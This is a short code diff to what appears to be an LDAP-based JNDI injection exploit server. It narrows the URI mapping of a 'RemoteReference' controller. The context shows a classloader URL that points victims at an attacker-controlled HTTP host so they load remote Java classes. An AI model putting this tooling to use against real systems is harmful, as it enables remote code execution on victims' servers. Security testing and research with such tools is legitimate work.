@@ -22,7 +22,7 @@ import com.unboundid.ldap.sdk.ResultCode;
  *
  * @author artsploit
  */
-@LdapMapping(uri = { "/", "/o=reference" })
+@LdapMapping(uri = { "/o=reference" })
 public class RemoteReference implements LdapController {
 
     private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";
